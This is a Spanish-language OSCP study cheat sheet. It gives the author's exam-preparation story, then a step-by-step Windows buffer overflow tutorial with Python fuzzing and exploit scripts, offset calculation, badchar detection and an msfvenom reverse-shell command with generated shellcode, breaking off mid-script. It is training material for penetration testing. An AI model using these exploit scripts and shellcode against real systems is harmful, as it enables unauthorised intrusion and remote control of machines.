# Preparación para el OSCP (by s4vitar)

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

## Índice y Estructura Principal
- [Antecedentes - Experiencia Personal](#Antecedentes)
- [Buffer Overflow Windows (25 puntos)](#buffer-overflow-windows)
     * [Fuzzing](#fuzzing)
     * [Calculando el Offset (Tamaño del Búffer)](#calculando-el-offset)
     * [Controlando el registro EIP](#controlando-el-registro-eip)
     * [Situando y Asignando Espacio al Shellcode](#situando-y-asignando-espacio-al-shellcode)
     * [Detectando los Badchars](#detectando-los-badchars)
     * [Generando el Shellcode](#generando-el-shellcode)
     * [Salto al ESP (Mona / Immunity Debugger)](#salto-al-esp)
     * [Mejorando el Exploit](#mejorando-el-exploit)
     * [Reduciendo el Size y Acceso por Powershell](#reduciendo-el-size-y-acceso-por-powershell)
- [Buffer Overflow Linux (No cae en el examen)](#buffer-overflow-linux)
- [Pentesting](#pentesting)
     * [General](#general)
       * [Port Scanning](#port-scanning)
       * [Wfuzz](#Wfuzz)
       * [Nikto](#Nikto)
     * [Pentesting Web](#pentesting-web)
       * [LFI (Local File Inclusion)](#lfi)
       * [LFI to RCE](#lfi-to-rce)
       * [RFI (Remote File Inclusion)](#rfi)     
       * [SQLI (SQL Inyection)](#sqli)     
       * [Shellshock](#shellshock)
       * [Padding Oracle Attack](#padding-oracle-attack)   
       * [WordPress](#wordpress)
       * [File Upload Bypass](#file-upload-bypass)
       * [Fuerza Bruta en Formularios](#fuerza-bruta-en-formularios)
       * [Enumeración de Usuarios en Paneles de Autenticación](#login-user-enumeration)
       * [PHP Reverse Shell](#php-reverse-shell)
       * [PHP Reverse Shell Manual Multifuncional](#php-reverse-shell-manual-multifuncional)       
       * [ASP/ASPX Reverse Shell](#asp-aspx-reverse-shell)
       * [NoTCPShell](#notcpshell)
       * [Burpsuite](#burpsuite)     
     * [Pentesting Linux](#pentesting-linux)
        * [Tratamiento de la TTY](#tratamiento-de-la-tty)
        * [Monitorizado de Procesos a Tiempo Real](#process-monitoring)
     * [Pentesting Windows](#pentesting-windows)
        * [Transferencia de Archivos](#transferencia-de-archivos)
        * [Evasión de Antivirus con Malware Genético](#av-evasion-genetic-malware)
        * [Port Forwarding y Técnicas de Enrutamiento](#windows-port-forwarding)
        * [Hashdump Manual](#hashdump-manual)
        * [PassTheHash](#passthehash)
        * [Enumeration & Privilege Escalation](#enumeration-and-privilege-escalation)
        * [Powershell Reverse Shell](#powershell-reverse-shell)
        * [Migración manual a proceso a 64 bits](#manual-migration-process)
        * [RCE Filter Evasion Microsoft SQL](#rce-filter-evasion-microsoft-sql)
        * [Conexión al Servicio Microsoft SQL con mssqclient.py de Impacket](#mssqlclient-impacket)

          
Antecedentes
===============================================================================================================================
Antes que nada me gustaría comentar un poco mi experiencia a la hora de abordar el curso, pues tal vez le sirva de inspiración para aquel que pretenda sacarse la certificación.

#### ¿Es difícil la certificación?

Diría que la respuesta es relativa, siempre va a depender de la soltura que tengas con máquinas de tipo _CTF/Challenge_. 

A mi por ejemplo la plataforma **HackTheBox** me ha servido de mucho para coger todo el fondo que tengo a día de hoy, así como **VulnHub** u **OverTheWire**. De hecho, lo que más me sorprendió a la hora de ir haciendo las máquinas del laboratorio fue la gran similitud con las máquinas de HackTheBox. Hablando en términos comparativos, os puedo decir que efectivamente corresponden a las de nivel medio de HTB, tal y como llegué a leer en su momento en algunos artículos de gente que había pasado con éxito la certificación.

Para que te quedes tranquilo, si juegas mucho con máquinas de tipo CTF y te entrenas día a día con retos desafiantes que te hagan pensar, no tienes de qué preocuparte.

#### ¿Qué plan me pillo?

En mi caso me llegué a pillar el plan de 3 meses, lo que se resume en unos 1.100 euros practicamente. 

Os puedo decir que en 1 mes ya tenía casi todas las máquinas hechas menos 4 de ellas que me siguieron quedando pendientes y no llegué a hacer (Eran las más Hard y vi que escapaban demasiado de la metodología del examen).

El segundo mes lo utilicé para seguir con HackTheBox así como para repasar las máquinas hechas y probar vías alternativas de resolver las mismas.

En base a cómo lo he vivido yo, os recomendaría más bien 2 meses de laboratorio, sobre todo por lo que me comentaba un gran compañero **Julio Ureña**, de que uno tiende a relajarse cuando tiene mucho tiempo por delante.

#### ¿Qué bases tuve antes de comenzar con la certificación?

A nivel de Pentesting, en VulnHub tenía 30 máquinas, en OverTheWire 6 de los retos principales y en HackTheBox 55 máquinas con permisos de administrador en cada una de ellas.

A nivel de Sistemas y programación, con muy buenas bases de Linux Avanzado, programación en Bash Avanzado y ligero tanto de Windows como de Python. Sí que es cierto que la certificación me hizo meterme más a fondo con Windows, así como con la programación en Python, de ahí me motivé de hecho para hacer la herramienta **spoofMe** para el Spoofing de llamadas y mensajería instantánea. 

A su vez a esto le sumo las auditorías reales de empresa que hago como Pentester en EnigmaSec, donde el hecho de practicar también en entornos reales me hace ver las cosas desde otra perspectiva.

Por último, a nivel de Búffer Overflow, no sabía hacer nada... entré con la mente en blanco a la certificación. Sin embargo, en 4 días ya sabía hacer todos los ejercicios del laboratorio en base a la guía y a los vídeos de apoyo con los que cuentas en el material que te dan.

#### ¿Qué horarios de estudio seguías?

Esto tal vez ha sido lo más mortal, desafiante, doloroso pero a su vez fructífero. Estuve aplicando **Uberman** durante los 3 meses de preparación, una técnica de sueño polifásico que hace que con tan sólo dormir 3 horas seguidas aplicando posteriormente descansos de 20 minutos a intervalos regulares de tiempo puedas estar activo y despierto (Que no falten los que me conocen de cerca y me llamaban loco).

Decidí aplicarlo porque básicamente el día se pasaba muy rápido, cuando uno está trabajando tiene prioridades y debe anteponer las tareas y proyectos frente a lo demás. Para poder dedicarle tiempo de estudio al laboratorio, estuve sobre todo el primer mes aplicando a fondo la técnica, estudiando y practicando aproximadamente desde las 7 de la tarde hasta las 5 de la mañana.

He de decir que también es un gran puñado de motivación lo que hace que estés dispuesto a hacer esto, en caso contrario ni lo habría intentado. Aún así no lo recomiendo hacer, pues es perjudicial para la salud, pero dependerá de cada cual como pretenda organizarse sus horas de estudio.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

En primer lugar hacerte una cuenta de **HackTheBox**, incluso te diría de pagarte la cuenta VIP para tener acceso a las máquinas retiradas. Tienes a tu disposición canales en Youtube como el de **ippsec**, que te explica paso a paso todas las máquinas retiradas con técnicas bastante chulas tanto de explotación en Windows como en Linux.

Te recomiendo practicar en este tipo de entornos todo lo que puedas, pues son los que te harán ver una vez comiences con el laboratorio que hay bastante similitud y que no es tan costoso. Para las máquinas del laboratorio, te darás cuenta de que los entornos están un poco "deprecated", en el sentido de que son máquinas algo antiguas con arquitectura de 32 bits. A la hora de abordar estas máquinas, mi consejo es que no trates de explotarlas haciendo uso de exploits modernos, pues están pensadas para que practiques distintas vías de explotación con técnicas no tan actuales, lo que hace que ganes más fondo.

#### ¿Qué es lo más duro de la certificación?

La gestión del tiempo. Mi recomendación y por lo que he escuchado de los demás y coincido, es empezar con el Búffer Overflow a la hora de abordar el examen. Teniendo cierta soltura no te debería de llevar más de 1 hora.

Una vez hecho, ya cuentas con 25 puntos del examen. El siguiente paso es saltar a la máquina de 10 puntos, suele ser una explotación rápida y directa como administrador del sistema. Con estos 35 puntos bajo la manga, lo más recomendable es dedicarle un buen tiempo a la otra máquina de 25 puntos, pues en caso de sacarla, estarías a 60 puntos y con conseguir el User de alguno de los otros 2 sistemas de 20 puntos ya estarías aprobado (Intenta aspirar a más y hazlas todas :P).

En cuanto al laboratorio, es justamente el entorno deprecated lo que hace un poco tediosa la compilación y ejecución de exploits, pues en la mayoría de las veces te dará una petada de las importantes. Pero no te frustres, siempre con un poco de café y buena actitud se saca.

#### ¿Cuáles son los siguientes pasos?

Como siempre, uno nunca debe dejar de hacer lo que le gusta... y aún me queda un puñado de cosas por aprender. Será cuestión de seguir aprendiendo lo que hará que aparezca una respuesta a esta pregunta.

Sin más, ¡os dejo con toda la preparación del curso!


Buffer Overflow Windows
===============================================================================================================================
A continuación, se listan los pasos a seguir para la correcta explotación de Buffer Overflow en Linux (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.

Servicios/Máquinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio

Generalmente, la metodología a seguir es la que se describe a continuación.

#### Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = ["A"]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) < 30:
  buffer.append("A"*contador)
  contador += 200
  
for strings in buffer:
  try:
    print "Enviando %s bytes..." % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send("USER " + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print "\nError de conexión...\n"
    sys.exit(0)

```
De esta forma, a través de una lista, vamos almacenando en la variable **buffer** el caracter "A" un total 30 veces con un incremento para cada una de las iteraciones en 200. 

Esto es:

**[1 caracter "A", 100 caracteres "A", 300 caracteres "A", 500 caracteres "A", 700 caracteres "A", ...]**

Mientras tanto, desde _Immunity Debugger_, estando previamente sincronizados con el proceso, deberemos de utilizarlo como debugger para ver en qué momento se produce una violación de segmento.

Cuando esto ocurra, deberíamos ver como el registro **EIP** toma el valor (**41414141**), correspondiente al caracter "A" en hexadecimal.

Lo bueno de haber creado la lista, es que podemos identificar rápidamente entre qué valores se produce el Búffer Overflow, en otras palabras, si vemos que tras la ejecución de nuestro script en Python el último reporte que se hizo fue **"Enviando 700 bytes..."**, lo conveniente es modificar nuestro script al siguiente contenido:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*900
ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
Siempre para asegurar es mejor mandarle los 200 caracteres siguientes de nuestro reporte. Tras la ejecución de esta variante, **Immunity Debugger** directamente nos debería reportar la violación de segmento con el valor **41414141** en el registro **EIP**, lo cual hace que ya tengamos una aproximación de tamaño del buffer permitido.

Para que te quedes tranquilo, en el examen te entregarán un script en Python a modo de PoC donde se aplica un desbordamiento de búffer sobre el servicio. Contando con esto, es simplemente ir haciendo los pasos que se enumeran a continuación.

#### Calculando el Offset

Dado que el valor 414141 para el EIP no es algo descriptivo que nos permita hacernos la idea de qué tamaño tiene el buffer permitido, lo que hacemos es aprovecharnos de las utilidades **pattern_create** y **pattern_offset** de Metasploit.

La funcionalidad **pattern_create** nos permitirá generar un puñado de caracteres aleatorios en base a una longitud fijada como criterio. 

Ejemplo:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9
```

Para el ejemplo mostrado, hemos generado 900 bytes de caracteres aleatorios, lo único que tendríamos que hacer es sustituir el caracter "A" de nuestra variable _buffer_ por el contenido que **pattern_create** nos ha devuelto:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Lo que conseguimos con esto es determinar a través del valor del registro **EIP** desde **Immunity Debugger** una vez se produce la violación de segmento, qué caracteres están sobreescribiendo dicho registro.

Supongamos que el registro **EIP** toma este valor tras la detención del servicio una vez producido el desbordamiento:

**EIP -> 39426230**

A fin de realizar su traducción y ver qué caracteres de nuestro búffer corresponden a estos valores, podemos aplicar el siguiente comando desde terminal:

```bash
$~ echo "\0x39\0x42\0x62\0x30" | xxd -ps -r

9Bb0

```

Lo que hace que inmediatamente veamos los caracteres a los que corresponden dichos valores. Una vez identificados, podemos a través del **pattern_offset** de Metasploit calcular el offset, permitiéndonos así conocer ya el tamaño del buffer previo a la sobreescritura del registro EIP:

```bash
$~ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 9Bb0

[*] Exact match at offset 809
```

#### Controlando el registro EIP

Conociendo ya el offset, podemos tomar el control del registro EIP. Dado que el registro **EIP** apunta a la siguiente dirección a ejecutar (pues dirige el flujo del programa), poder sobrescribir su valor es crucial para conseguir una ejecución alternativa del servicio a nivel de sistema (lo veremos más adelante).

Dado que el offset es 809, podemos crear el siguiente PoC a fin de verificar que tenemos el control del registro **EIP**:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(900-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

El caracter "C" lo meto como Padding para hacer relleno hasta llegar a los 900 (para trabajar con cifras redondas).

Tras la ejecución del script, desde el **Immunity Debugger** veremos que una vez se produce la violación de segmento, el registro **EIP** toma el valor **42424242**, equivalente a _"B"*4_. Llegados a este punto, es hora de encontrar el lugar en el que situar nuestro Shellcode.

#### Situando y Asignando Espacio al Shellcode

A la hora de hacer Padding con el caracter "C" tras sobrescribir previamente el registro **EIP**, podremos ver desde el **Immunity Debugger** como el registro **ESP** coincide con nuestro relleno. Llegados a este punto, para el caso que estamos tratando se podría decir que nuestro shellcode tendría que tener un total de 87 bytes, cosa que escapa de la realidad, pues en la mayoría de las veces para entablar una conexión reversa se generan un total de 351 bytes aproximadamente desde **msfvenom**.

La idea aquí, es rezar 2 padres nuestros para que tras ampliar considerablemente el relleno, el servicio no crashee de otra forma. En caso de "_crashing_" (vamos a llamarlo así), si vemos que el registro **EIP** ya no vale lo que debería, tendremos que ver hasta qué tamaño podemos hacer relleno sin que el servicio corrompa de otra manera alternativa.

Hay casos como el de Linux que explicaré donde sólo contamos con 7 bytes de espacio. En ese caso la idea consiste en aprovechar estos 7 bytes para a través de 5 bytes definir ciertas instrucciones de desplazamiento y salto entre registros, permitiéndonos insertar nuestro Shellcode en un nuevo registro donde contamos con el espacio suficiente.

Pero para el caso, y de cara a la examinación... no habrá que preocuparse. Modificamos para ello el script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = "A"*809 + "B"*4 + "C"*(1300-809-4)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```
En este caso ampliamos de forma considerable nuestro relleno, donde tras sobrescribir el registro **EIP**, contamos con un total de 487 bytes de espacio donde los caracteres "C" serán situados. En caso de ver desde **Immunity Debugger** que todo figura como lo esperado, podremos quedarnos tranquilos, pues tenemos espacio suficiente para depositar nuestro Shellcode sobre el registro **ESP**.

#### Detectando los Badchars

Esta será la única complicación del examen, y cuando digo complicación la sitúo entre comillas gestualmente hablando. 

A la hora de generar nuestro Shellcode, existen ciertos caracteres que en función del servicio con el que estemos tratando no son aceptados, causando una ejecución errónea de las instrucciones que pretendamos inyectar a nivel de sistema.

Detectar estos caracteres no es nada complejo, lo único que necesitamos es una estructura como la siguiente:

`"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"`

A fin de detectar cuáles de estos caracteres no son aceptados por el servicio, configuramos nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*809 + "B"*4 + badchars + "C"*(1300-809-4-255)

ipAddress = sys.argv[1]

port = 4000

try:
  print "Enviando búffer..."
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ipAddress, port))
  s.recv(1024)
  s.send("USER " + buffer + '\r\n')
  s.recv(1024)
  s.close()
except:
  print "\nError de conexión...\n"
  sys.exit(0)

```

Desde **Immunity Debugger**, tras la ejecución del script podremos ver una vez se produce el desbordamiento del búfer los valores que están siendo depositados sobre el registro ESP, correspondiente a nuestros badchars. La idea aquí es caracter que no veamos, caracter que debemos desechar en el envío de nuestros badchars.

Generalmente, los caracteres **\x0a** y **\x0d** suelen ser badchars, pero pueden varían en función del servicio que estemos utilizando. Algo importante a tener en cuenta es el caracter **\x00**, badchar que por norma general no suele ser incluido de forma visual en la estructura de badchars, pues es genérico y siempre debe ser omitido a la hora de generar nuestro Shellcode.

Suponiendo que hemos detectado que los badchars para este caso son **\x00\x0a\x0d**, lo único que nos queda ya es generar nuestro Shellcode. 

#### Generando el Shellcode

El shellcode que se generará a continuación, lo que nos hará será entablar una conexión TCP reversa contra el equipo. Para ello, seguimos la siguiente sintaxis:

```
$~ msfvenom -p windows/shell_reverse_tcp lhost=127.0.0.1 lport=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
"\x1a\x4f\xaa\x45\x92\xaa\x9b\x45\xc0\xbf\x8c\x75\x82\xed\x20"
"\xfd\xc6\x05\xb2\x73\xcf\x2a\x73\x39\x29\x05\x84\x12\x09\x04"
"\x06\x69\x5e\xe6\x37\xa2\x93\xe7\x70\xdf\x5e\xb5\x29\xab\xcd"
"\x29\x5d\xe1\xcd\xc2\x2d\xe7\x55\x37\xe5\x06\x77\xe6\x7d\x51"
"\x57\x09\x51\xe9\xde\x11\xb6\xd4\xa9\xaa\x0c\xa2\x2b\x7a\x5d"
"\x4b\x87\x43\x51\xbe\xd9\x84\x56\x21\xac\xfc\xa4\xdc\xb7\x3b"
"\xd6\x3a\x3d\xdf\x70\xc8\xe5\x3b\x80\x1d\x73\xc8\x8e\xea\xf7"
"\x96\x92\xed\xd4\xad\xaf\x66\xdb\x61\x26\x3c\xf8\xa5\x62\xe6"
"\x61\xfc\xce\x49\x9d\x1e\xb1\x36\x3b\x55\x5c\x22\x36\x34\x09"
"\x87\x7b\xc6\xc9\x8f\x0c\xb5\xfb\x10\xa7\x51\xb0\xd9\x61\xa6"
"\xb7\xf3\xd6\x38\x46\xfc\x26\x11\x8d\xa8\x76\x09\x24\xd1\x1c"
"\xc9\xc9\x04\xb2\x99\x65\xf7\x73\x49\xc6\xa7\x1b\x83\xc9\x98"
"\x3c\xac\x03\xb1\xd7\x57\xc4\xc1\x27\x57\x15\x56\x2a\x57\x14"
"\x1d\xa3\xb1\x7c\x71\xe2\x6a\xe9\xe8\xaf\xe0\x88\xf5\x65\x8d"
"\x8b\x7e\x8a\x72\x45\x77\xe7\x60\x32\x77\xb2\xda\x95\x88\x68"
"\x72\x79\x1a\xf7\x82\xf4\x07\xa0\xd5\x51\xf9\xb9\xb3\x4f\xa0"
"\x13\xa1\x8d\x34\x5b\x61\x4a\x85\x62\x68\x1f\xb1\x40\x7a\xd9"
"\x3a\xcd\x2e\xb5\x6c\x9b\x98\x73\xc7\x6d\x72\x2a\xb4\x27\x12"
"\xab\xf6\xf7\x64\xb4\xd2\x81\x88\x05\x8b\xd7\xb7\xaa\x5b\xd0"
"\xc0\xd6\xfb\x1f\x1b\x53\x0b\x6a\x01\xf2\x84\x33\xd0\x46\xc9"
"\xc3\x0f\x84\xf4\x47\xa5\x75\x03\x57\xcc\x70\x4f\xdf\x3d\x09"
"\xc0\x8a\x41\xbe\xe1\x9e"
```
Una vez generado el shellcode, lo añadimos a nuestro script de la siguiente forma:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

shellcode = ("\xba\xfc\xb2\xc0\x24\xdb\xd3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x57\x0e\x03\xab\xbc\x22\xd1\xaf\x29\x20"
